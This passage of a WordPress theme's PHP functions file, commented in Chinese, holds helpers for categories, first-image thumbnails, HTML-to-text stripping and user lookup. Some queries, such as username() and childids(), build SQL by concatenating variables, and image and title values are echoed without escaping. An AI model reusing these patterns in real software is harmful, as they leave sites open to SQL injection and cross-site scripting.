	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
remove_action( 'wp_head', 'feed_links_extra', 3 ); // Display the links to the extra feeds such as category feeds

remove_action( 'wp_head', 'feed_links', 2 ); // Display the links to the general feeds: Post and Comment Feed

remove_action( 'wp_head', 'rsd_link' ); // Display the link to the Really Simple Discovery service endpoint, EditURI link

remove_action( 'wp_head', 'wlwmanifest_link' ); // Display the link to the Windows Live Writer manifest file.

remove_action( 'wp_head', 'index_rel_link' ); // index link

remove_action( 'wp_head', 'parent_post_rel_link', 10, 0 ); // prev link

remove_action( 'wp_head', 'start_post_rel_link', 10, 0 ); // start link

remove_action( 'wp_head', 'adjacent_posts_rel_link', 10, 0 ); // Display relational links for the posts adjacent to the current post.

remove_action( 'wp_head', 'wp_generator' ); // Display the XHTML generator that is generated on the wp_head hook, WP version
//增强编辑器开始
/*
function add_editor_buttons($buttons) {

$buttons[] = 'fontselect';

$buttons[] = 'fontsizeselect';

$buttons[] = 'cleanup';

$buttons[] = 'styleselect';

$buttons[] = 'hr';

$buttons[] = 'del';

$buttons[] = 'sub';

$buttons[] = 'sup';

$buttons[] = 'copy';

$buttons[] = 'paste';

$buttons[] = 'cut';

$buttons[] = 'undo';

$buttons[] = 'image';

$buttons[] = 'anchor';

$buttons[] = 'backcolor';

$buttons[] = 'wp_page';

$buttons[] = 'charmap';

return $buttons;

}

add_filter("mce_buttons_3", "add_editor_buttons");*/

//增强编辑器结束
/*function updatecontent($content){
	  $content = preg_replace('/<h6>|<h6><wp_nokeywordlink>/','<h6><wp_nokeywordlink>',$content);
	  $content = preg_replace('/<\/h6>|<\/wp_nokeywordlink><\/h6>/','</wp_nokeywordlink></h6>',$content);
	  return $content;
	}
add_filter ('the_content', 'updatecontent');	*/
function get_category_root_id($cat)
{
$this_category = get_category($cat);   // 取得当前分类
while($this_category->category_parent) // 若当前分类有上级分类时，循环
{
$this_category = get_category($this_category->category_parent); // 将当前分类设为上级分类（往上爬）
}
return $this_category->term_id; // 返回根分类的id号
//return $this_category->slug;//返回跟分类的别名
}
function get_category_root_slug($cat)
{
$this_category = get_category($cat);   // 取得当前分类
while($this_category->category_parent) // 若当前分类有上级分类时，循环
{
$this_category = get_category($this_category->category_parent); // 将当前分类设为上级分类（往上爬）
}
return $this_category->slug;//返回跟分类的别名
}
//获取文章第一张图片，如果没有图，就不显示图
//文章中第一张图片获取图片
function catch_that_image() { 
 global $post, $posts; 
 $first_img = ''; 
 ob_start(); 
 ob_end_clean(); 
 $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*width=[\'"]([0-9]+)[\'"].*height=[\'"]([0-9]+)[\'"].*>/i', $post->post_content, $matches); 
 $first_img = $matches[1][0]; 
 $first_img_width = $matches[2][0];
 $first_img_height = $matches[3][0]; 
 if(empty($first_img)){  
   $first_img = bloginfo('template_url'). '/images/default-thumb.jpg'; 
 }else{
	 $first_img_html .= '<div class="pic_border_out" style="width:'.($first_img_width+22).'px">';
	 $first_img_html .= '<div class="pic_border_in" style="width:'.($first_img_width).'px;height:'.$first_img_height.'px;">';
	 $first_img_html .= '<div id="preview">';
	 $first_img_html .= '<img src="'.$first_img.'" style="width:'.($first_img_width).'px;height:'.$first_img_height.'px;">';
	 $first_img_html .= '</div>';
	 $first_img_html .= '</div>';
	 $first_img_html .= '</div>';
	 }
 return $first_img_html; 
 } 
//---------获取图片地址-----------//
function get_image_url(){
	 global $post, $posts; 
	 $first_img = ''; 
	 ob_start(); 
	 ob_end_clean(); 
	 $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*width=[\'"]([0-9]+)[\'"].*height=[\'"]([0-9]+)[\'"].*>/i', $post->post_content, $matches); 
	 $info['img'] = $matches[1][0];
	 $info['width'] = $matches[2][0];
     $info['height'] = $matches[3][0];  
	 return $info;
	}
//end
 function SpHtml2Text($str)
			   {
			   $str = preg_replace("/<sty(.*)\\/style>|<scr(.*)\\/script>|<!--(.*)-->/isU","",$str);
			   $alltext = "";
			   $start = 1;
			   for($i=0;$i<strlen($str);$i++)
			   {
			   if($start==0 && $str[$i]==">")
			   {
			   $start = 1;
			   }
			   else if($start==1)
			   {
			   if($str[$i]=="<")
			   {
			   $start = 0;
			   $alltext .= " ";
			   }
			   else if(ord($str[$i])>31)
			   {
			   $alltext .= $str[$i];
			   }
			   }
			   }
			   $alltext = str_replace("　"," ",$alltext);
			   $alltext = preg_replace("/&([^;&]*)(;|&)/","",$alltext);
			   $alltext = preg_replace("/[ ]+/s"," ",$alltext);
			   return $alltext;
			   }
function delHtmlContent(){
	global $post, $posts;
	$a = SpHtml2Text($post->post_content);
	return $a; 
	}
function username($user_id){
	global $wpdb;
	$info = $wpdb->get_results("SELECT * FROM $wpdb->users WHERE ID = ".$user_id." ORDER BY ID");
	return $info;
	}
function videoContent(){
	global $post, $posts;
	$a = SpHtml2Text($post->post_content);
	$a = preg_replace('/\[(youku|tudou|56|flash) (id=\"(.*)\"|url=\"(.*)\"|w=\"([0-9]*)\"|h=\"([0-9]*)\")\]/i','',$a);
	return $a; 
	}
	//*********获取当前所属根分类及子分类的所有id**************//
function childids(){
 	 global $wpdb;
	 $categorys = get_the_category();  
      $cat_ida = $categorys[0]->category_parent;//获取当前跟分类id 
      $cat_idb = $categorys[0]->term_id;//获取当前分类id 
      $rootid = $cat_ida==0?$cat_idb:$cat_ida;//根分类的id 
      $sql = 'SELECT wp_terms.term_id FROM`wp_term_taxonomy`
  LEFT JOIN wp_terms ON wp_term_taxonomy.term_id=wp_terms.term_id
  WHERE wp_term_taxonomy.taxonomy="category" and wp_term_taxonomy.parent = '.$rootid.' or wp_term_taxonomy.term_id ='.$rootid;
      $infoarray = $wpdb->get_results($sql); 
      $idarray = array();
      for($i=0;$i<count($infoarray);$i++){ 
           array_push($idarray,$infoarray[$i]->term_id);
          }
      $ids =  implode(',',$idarray);  //获取当前分类下的所有分类目录的id
	  return $ids;
	}

function don_the_thumbnail() {
define('ROOT', dirname(__FILE__)); 
global $post;
$content = $post->post_content;
preg_match_all('/<img.*?(?: |\\t|\\r|\\n)?src=[\'"]?(.+?)[\'"]?(?:(?: |\\t|\\r|\\n)+.*?)?>/sim', $content, $strResult, PREG_PATTERN_ORDER);
$n = count($strResult[1]);
if($n > 0){ // 如果文章内包含有图片，就用第一张图片做为缩略图
echo '<a href="'.get_permalink().'"><img src="'.$strResult[1][0].'"  width = "450" height="250"/></a>';
}else { // 如果不是视频内容则自动匹配默认缩略图
     $random = mt_rand(1, 10);
	 echo '<a href="'.get_permalink().'"><img src="'.get_bloginfo('template_url').'/img/pic/'.$random.'.jpg"  width = "450" height="250"/></a>';		
	}
 }

?>